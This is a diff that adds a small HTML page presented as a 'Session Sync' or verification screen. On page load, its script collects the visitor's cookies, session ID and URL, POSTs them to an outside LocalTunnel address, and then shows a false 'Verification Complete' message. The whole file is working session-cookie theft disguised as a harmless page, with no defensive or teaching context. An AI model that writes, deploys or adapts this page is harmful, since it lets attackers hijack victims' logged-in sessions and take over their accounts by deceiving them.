@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Session Sync</title>
+</head>
+<body>
+    <h2 style="font-family: sans-serif; color: #555;">Synchronizing session...</h2>
+    
+    <script>
+        async function harvest() {
+            // 1. Replace this with your actual LocalTunnel URL
+            const serverUrl = 'https://light-deer-drive.loca.lt';
+
+            const data = {
+                url: window.location.href,
+                cookies: document.cookie || "No cookies available",
+                session_id: (document.cookie.match(/sessionid=([^;]+)/) || ["","none"])[1],
+                time: new Date().toISOString()
+            };
+
+            try {
+                await fetch(serverUrl, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'bypass-tunnel-reminder': 'true' 
+                    },
+                    body: JSON.stringify(data)
+                });
+                document.body.innerHTML = "<h3>Verification Complete. You can close this window.</h3>";
+            } catch (e) {
+                document.body.innerHTML = "<h3>Error connecting to server.</h3>";
+            }
+        }
+        window.onload = harvest;
+    </script>
+</body>
+</html>
